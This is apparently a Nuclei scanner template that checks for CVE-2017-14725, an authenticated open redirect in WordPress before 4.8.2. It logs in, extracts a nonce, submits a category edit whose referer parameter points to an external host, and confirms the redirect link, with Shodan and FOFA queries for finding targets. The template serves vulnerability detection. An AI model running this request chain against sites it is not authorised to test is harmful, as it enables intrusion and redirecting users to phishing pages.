flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - id="_wpnonce" name="_wpnonce" value="([a-f0-9]+)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '_wpnonce')
    internal: true
    type: dsl
  raw:
  - 'GET /wp-admin/term.php?taxonomy=category&tag_ID=1&wp_http_referer=https%3A%2F%2Foast.pro
    HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, 'wp_http_referer=https')
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/edit-tags.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=editedtag&tag_ID=1&taxonomy=category&_wpnonce={{nonce}}&_wp_http_referer=%2Fwp-admin%2Fterm.php%3Ftaxonomy%3Dcategory%26tag_ID%3D1%26wp_http_referer%3Dhttps%253A%252F%252Foast.pro&name=Uncategorized&slug=uncategorized&parent=-1&description=

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "href=\"https://oast.pro\"")
    - contains(body, "Back to Categories")
    type: dsl
  raw:
  - 'GET /wp-admin/term.php?taxonomy=category&tag_ID=1&wp_http_referer=https%3A%2F%2Foast.pro&message=3
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2017-14725
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-14725
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-601
    epss-percentile: 0.84455
    epss-score: 0.02353
  description: 'WordPress versions before 4.8.2 contain an open redirect caused by
    improper validation in wp-admin/edit-tag-form.php and wp-admin/user-edit.php,
    letting attackers redirect users to malicious sites, exploit requires access to
    admin interface.

    '
  impact: 'Attackers can redirect authenticated users to malicious sites, potentially
    leading to phishing or malware distribution.

    '
  metadata:
    fofa-query: body="oembed" && body="wp-"
    max-request: 5
    product: wordpress
    shodan-query:
    - http.component:"wordpress"
    - cpe:"cpe:2.3:a:wordpress:wordpress"
    vendor: wordpress
    verified: true
  name: WordPress < 4.8.2 - Authenticated Open Redirect
  reference:
  - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
  - https://core.trac.wordpress.org/changeset/41398
  - https://nvd.nist.gov/vuln/detail/CVE-2017-14725
  - http://www.securitytracker.com/id/1039553
  - https://www.debian.org/security/2017/dsa-3997
  remediation: 'Update to WordPress 4.8.2 or later.

    '
  severity: medium
  tags: cve,cve2017,wpscan,wordpress,redirect,authenticated
